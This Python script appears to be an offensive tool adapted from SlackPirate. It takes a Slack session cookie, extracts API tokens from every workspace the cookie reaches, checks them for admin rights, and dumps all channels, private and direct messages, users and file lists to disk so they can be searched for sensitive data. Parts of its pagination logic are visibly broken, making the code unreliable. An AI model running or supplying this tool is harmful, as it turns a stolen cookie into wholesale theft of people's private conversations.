import httpx
import urllib
import re
import argparse
import time
import json
import os
import http
from time import sleep
from slack_sdk import WebClient
from alive_progress import alive_bar

# For debugging with proxy, add "ssl=context" in WebClient and "proxy='http://127.0.0.1:8080"
#import ssl
#context = ssl.SSLContext()
#context.verify_mode = ssl.CERT_NONE 
#context.check_hostname = False


ALREADY_SIGNED_IN_TEAM_REGEX = r"([a-zA-Z0-9\-]+\.slack\.com)"
SLACK_API_TOKEN_REGEX = r"(xox[a-zA-Z]-[a-zA-Z0-9-]+)"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36"


class ScanningContext:
    """
    Contains context data for performing scans and storing results.
    From https://github.com/emtunc/SlackPirate/blob/master/SlackPirate.py
    """

    def __init__(self, output_directory: str, slack_workspace: str, user_agent: str, user_id: str, username: str):
        self.output_directory = output_directory
        self.slack_workspace = slack_workspace
        self.user_agent = user_agent
        self.user_id = user_id
        self.username = username



##################################
####### GET INITIAL TOKENS #######
##################################

def list_cookie_tokens(cookies):
    """
    If the --cookie flag is set then the tool connects to a Slack Workspace that you won't be a member of then RegEx
    out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then RegEx out the
    api_token and return them.
    Function from https://github.com/emtunc/SlackPirate/blob/master/SlackPirate.py
    """
    workspaces = []
    try:
        r = httpx.get("https://slackpirate-donotuse.slack.com", cookies=cookies)
        headers = {
            'User-Agent': USER_AGENT,
        }
        already_signed_in_match = set(re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content)))
        if already_signed_in_match:
            for workspace in already_signed_in_match:
                r = httpx.get("https://" + workspace + "/customize/emoji", cookies=cookies, headers=headers)
                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                for slack_token in regex_tokens:
                    collected_scan_context = init_scanning_context(token=slack_token, cookies=cookies, user_agent=USER_AGENT)
                    admin = check_if_admin_token(token=slack_token, cookies=cookies, scan_context=collected_scan_context)
                    workspaces.append((workspace, slack_token, admin))
    except Exception as e:
        workspaces = None  # differentiate between no workspaces found and an exception occurring
        print(e)
    
    return workspaces


def check_if_admin_token(token, cookies, scan_context):
    """
    Checks to see if the token provided is an admin, owner, or primary_owner.
    Function from https://github.com/emtunc/SlackPirate/blob/master/SlackPirate.py
    """

    try:
        r = httpx.get("https://slack.com/api/users.info", cookies=cookies, params=dict(
            token=token, pretty=1, user=scan_context.user_id), headers={'User-Agent': scan_context.user_agent}).json()
        return r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']
    except Exception as e:
        print(e)


def init_scanning_context(token, cookies, user_agent: str):
    """
    Initialize the Scanning Context which is used for all the scans.
    Function from https://github.com/emtunc/SlackPirate/blob/master/SlackPirate.py
    """

    result = None
    try:
        r = httpx.post("https://slack.com/api/auth.test", cookies=cookies, params={"token": token},
                          headers={'User-Agent': user_agent}).json()
        if str(r['ok']) == 'True':
            result = ScanningContext(output_directory=str(r['team']) + '_' + time.strftime("%Y%m%d-%H%M%S"),
                                     slack_workspace=str(r['url']), user_agent=user_agent, user_id=str(r['user_id']), username=str(r['user']))
        else:
            print("[ERROR]: Token not valid. Slack error: " + str(r['error']))
            exit()
    except Exception as e:
        print(e)
    return result


######################################
####### ANALYZE EACH WORKSPACE #######
######################################

def analyze_workspace(workspace_data, cookie, out_dir, types=""):
    """Gievn a workspace analyze it"""

    workspace, slack_token, admin = workspace_data
    print(f"[*] Analyzing {workspace} with api key {slack_token} (is admin: {admin})")
    
    client = WebClient(token=slack_token)
    client.headers["Cookie"] = f"d={cookie}"
    client.headers["User-Agent"] = USER_AGENT
    
    channels = []
    files_info = []
    for t in ["public_channel","private_channel","mpim","im"]: #https://api.slack.com/methods/conversations.list
        print(f"[+] Getting channels and filenames of type {t}...")
        channels_t = get_channels(client, types=t)
        if channels_t["ok"]:
            channels += channels_t["channels"]
            with alive_bar(len(channels_t["channels"])) as bar:
                for c in channels_t["channels"]:
                    files_info += get_channel_files(client, c["id"])
                    bar()
    
    print("[+] Getting users...")
    users = get_workspace_users(client)

   
    current_dir = f"{out_dir}/{workspace}"
    try:
        os.mkdir(current_dir)
    except FileExistsError:
        pass
    
    with open(f"{current_dir}/0_users.txt", "w") as f:
        json.dump(users, f, indent=4)
    
    with open(f"{current_dir}/0_filenames.txt", "w") as f:
        json.dump(files_info, f, indent=4)
    
    
    raw_file = f"{current_dir}/1_raw_msgs.txt"

    channels_info = {}

    for c in channels:
        if c.get("name"):
            name = c['name']
            print("Channel:", c['name'])
        else:
            name = c['user']
            print("Chat with:", c['user'])

        channel_msgs = get_channel_messages(c, client)
        channel_info = {
            "metadata": c,
            "messages": channel_msgs
        }

        channels_info[name] = channel_info
        
        file_path = f"{current_dir}/{name}"
        with open(f"{file_path}", "w") as f:
            json.dump(channel_info, f, indent=4)
        
        with open(f"{raw_file}", "a") as f:
            for msg in channel_msgs:
                if msg.get("text"):
                    f.write(f"{msg['text']}\n")

    return channels_info

def get_channels(client,types):
    """Get all the messages sent in a channel"""

    data_channels = client.conversations_list(limit=1000, types=types)
    all_channels = data_channels["channels"]
    while data_channels.get("response_metadata",{}).get("next_cursor"):
        data_channels = client.conversations_list(limit=1000, types=types, cursor=data_channels["response_metadata"]["next_cursor"]).data
        all_channels += data_channels["channels"]
    
    return data_channels

def get_channel_messages(channel_data, client):
    """Get all the messages sent in a channel"""
    try:
        data_texts = client.conversations_history(channel=channel_data['id'], limit=1000).data
    except http.client.IncompleteRead:
        sleep(30)
        data_texts = client.conversations_history(channel=channel_data['id'], limit=1000).data
    
    all_texts = data_texts["messages"]
    while data_texts.get("response_metadata",{}).get("next_cursor"):
        data_texts = client.conversations_history(channel=channel_data['id'], limit=1000, cursor=data_texts["response_metadata"]["next_cursor"]).data
        for msg in data_texts["messages"]:
            all_texts.append(msg)
            if msg.get("reply_users"):
                #Only get 1000 replies (I don't think there are more than that)
                thread_texts = client.conversations_replies(channel=channel_data['id'], limit=1000, ts=msg["ts"]).data
                if thread_texts["ok"] and len(thread_texts["messages"]) > 1:
                    all_texts += thread_texts["messages"][1:] #Do not add the original as it was already added
    
    return all_texts

def get_workspace_users(client):
    """Get all the users of the workspace"""
    
    data_users = client.users_list(limit=1000).data
    all_users = data_users["members"]
    while data_users.get("response_metadata",{}).get("next_cursor"):
        data_users = client.conversations_history(limit=1000, cursor=data_users["response_metadata"]["next_cursor"]).data
        all_users += data_users["members"]
    
    return all_users


def get_channel_files(client, channel_id, page=1):
    """Get all the files of the workspace"""
    
    data_files = client.files_list(channel=channel_id, count=1000, page=page).data

    all_files = data_files["files"]
    while data_files.get("paging",{}).get("page", 0) < data_files.get("paging",{}).get("pages", 0):
        data_files = client.conversations_history(client=client, channel_id=channel_id, page=data_files.get("paging",{}).get("page")+1).data
        all_files += data_files["files"]
    
    return all_files


def main():
    parser = argparse.ArgumentParser(argument_default=None, description="A tool to dump all the conversations from all the channels from all the workspaces a slack cookie has access to. Then, you can search sensitive information in this dump.")
    parser.add_argument('--cookie', type=str, required=True,
                        help='Slack \'d\' cookie. This flag will instruct the tool'
                             ' to search for Workspaces associated with the cookie.')
    
    parser.add_argument('--output-dir', type=str, required=True,
                        help='Dir where the output will be saved')
    
    args = parser.parse_args()
    cookie = args.cookie
    out_dir = args.output_dir

    if not os.path.exists(out_dir):
        print(f"Folder {out_dir} doesn't exist")
        exit(1)

    # Check each workspace
    cookie = urllib.parse.quote(urllib.parse.unquote(cookie))
    cookies = {"d": cookie}
    workspaces = list_cookie_tokens(cookies=cookies)
    for w in workspaces:
        analyze_workspace(w, cookie, out_dir)



if __name__ == "__main__":
    main()
